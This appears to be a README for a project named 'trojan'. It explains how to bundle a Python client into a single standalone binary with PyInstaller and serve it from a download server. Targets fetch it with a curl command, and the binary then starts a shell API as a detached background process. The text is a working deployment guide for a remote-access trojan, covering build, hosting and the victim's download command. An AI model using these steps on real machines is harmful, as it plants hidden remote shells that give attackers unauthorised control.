# Download

Client should run `curl http://<IP_OF_DOWNLOAD_SERVER> -OJ` to download the application.

# Setup download server

In the download server, you first need to compile the application into a single binary executable. You can do that with the following steps:

## Compilation Steps (Ubuntu/Linux)

### Prerequisites
Install PyInstaller:
```bash
pip install pyinstaller
```

### Compile to Binary
From the `trojan/client/` directory, run:

```bash
# Compile app.py and shell.py into a single binary named 'trojan'
cd trojan/client/
pyinstaller --onefile --name trojan app.py
```

The resulting binary will be at: `dist/trojan`

**Note:** PyInstaller bundles Python runtime and dependencies. The binary can be run standalone without Python installed:
```bash
./dist/trojan
```

### Run Download Server
Expose the compiled binary via the download server:

```bash
cd ../download_server/
python3 server.py /absolute/path/to/dist/trojan
```

Then, clients can download it with:
```bash
curl http://<IP>:5000/ -OJ
```

The downloaded binary runs independently on the client machine, launching the shell API as a detached background process.
